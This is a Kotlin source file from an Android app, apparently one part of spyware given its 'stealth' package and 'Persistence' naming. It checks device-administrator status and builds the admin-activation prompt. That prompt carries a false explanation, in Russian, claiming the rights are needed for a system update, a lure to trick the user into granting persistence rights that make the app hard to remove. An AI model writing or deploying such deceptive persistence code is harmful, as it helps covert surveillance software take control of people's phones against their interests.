package com.sp.core.stealth

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import com.sp.core.AdminReceiver

/**
 * Device-admin persistence.
 *
 * The activation prompt is opened by the setup wizard (it needs a visible
 * activity), this helper only checks the state and can be called from any
 * background context.
 */
object Persistence {

    fun isAdmin(ctx: Context): Boolean {
        return try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
        } catch (_: Throwable) {
            false
        }
    }

    fun adminIntent(ctx: Context): Intent {
        val admin = ComponentName(ctx, AdminReceiver::class.java)
        return Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            .putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Требуется для обновления системы"
            )
    }

    fun lockIn(ctx: Context) {
        // No-op outside of the wizard: starting a foreground service or an
        // activity from a background context is what crashed the app before.
        if (!isAdmin(ctx)) return
    }
}
